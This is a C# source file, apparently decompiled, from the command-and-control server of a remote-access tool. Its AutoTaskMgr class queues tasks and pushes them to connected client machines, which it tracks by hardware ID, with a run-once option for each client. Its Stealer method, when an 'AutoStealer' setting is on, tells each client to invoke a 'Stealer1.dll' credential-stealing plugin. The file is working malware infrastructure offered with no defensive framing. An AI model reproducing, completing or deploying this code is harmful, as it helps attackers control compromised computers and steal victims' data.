using System.Collections;
using System.Collections.Generic;
using System.IO;
using System.Threading.Tasks;
using System.Windows.Forms;
using Newtonsoft.Json;
using Server.Connectings;
using Server.Data;

namespace Server.Helper.Tasks;

internal class AutoTaskMgr
{
	public static object SYNC = new object();

	public static void RunTasks(Clients clients)
	{
		if (!File.Exists("local\\Tasks.json"))
		{
			return;
		}
		lock (SYNC)
		{
			foreach (DataGridViewRow item2 in (IEnumerable)Program.form.dataGridView2.Rows)
			{
				Task item = (Task)item2.Tag;
				if (item.RunOnce)
				{
					bool flag = false;
					foreach (string item3 in item.TasksRunsed)
					{
						if (item3 == clients.Hwid)
						{
							flag = true;
							break;
						}
					}
					if (flag)
					{
						continue;
					}
					System.Threading.Tasks.Task.Run(delegate
					{
						clients.Send(item.task);
					});
					item.TasksRunsed.Add(clients.Hwid);
				}
				else
				{
					System.Threading.Tasks.Task.Run(delegate
					{
						clients.Send(item.task);
					});
				}
				item.Runs++;
				item2.Cells[1].Value = item.Runs;
			}
		}
	}

	public static void Import()
	{
		foreach (Task item in JsonConvert.DeserializeObject<List<Task>>(File.ReadAllText("local\\Tasks.json")))
		{
			DataGridViewRow dataGridViewRow = new DataGridViewRow();
			dataGridViewRow.Tag = item;
			dataGridViewRow.Cells.Add(new DataGridViewTextBoxCell
			{
				Value = item.RunOnce
			});
			dataGridViewRow.Cells.Add(new DataGridViewTextBoxCell
			{
				Value = item.Runs
			});
			dataGridViewRow.Cells.Add(new DataGridViewTextBoxCell
			{
				Value = item.Name
			});
			Program.form.dataGridView2.Invoke((MethodInvoker)delegate
			{
				Program.form.dataGridView2.Rows.Add(dataGridViewRow);
			});
		}
	}

	public static void Export()
	{
		List<Task> list = new List<Task>();
		foreach (DataGridViewRow item in (IEnumerable)Program.form.dataGridView2.Rows)
		{
			list.Add(item.Tag as Task);
		}
		File.WriteAllText("local\\Tasks.json", JsonConvert.SerializeObject(list));
	}

	public static void AppendTask(Task item)
	{
		DataGridViewRow dataGridViewRow = new DataGridViewRow();
		dataGridViewRow.Tag = item;
		dataGridViewRow.Cells.Add(new DataGridViewTextBoxCell
		{
			Value = item.RunOnce
		});
		dataGridViewRow.Cells.Add(new DataGridViewTextBoxCell
		{
			Value = item.Runs
		});
		dataGridViewRow.Cells.Add(new DataGridViewTextBoxCell
		{
			Value = item.Name
		});
		Program.form.dataGridView2.Invoke((MethodInvoker)delegate
		{
			Program.form.dataGridView2.Rows.Add(dataGridViewRow);
		});
		Clients[] array = Program.form.ClientsAll();
		foreach (Clients clients in array)
		{
			System.Threading.Tasks.Task.Run(delegate
			{
				RunTasks(clients);
			});
		}
	}

	public static void Stealer(Clients clients)
	{
		if (File.Exists("local\\Settings.json") && JsonConvert.DeserializeObject<Settings>(File.ReadAllText("local\\Settings.json")).AutoStealer)
		{
			System.Threading.Tasks.Task.Run(delegate
			{
				clients.Send(new object[3]
				{
					"Invoke",
					Methods.GetChecksum("Plugin\\Stealer1.dll"),
					new byte[1]
				});
			});
		}
	}
}
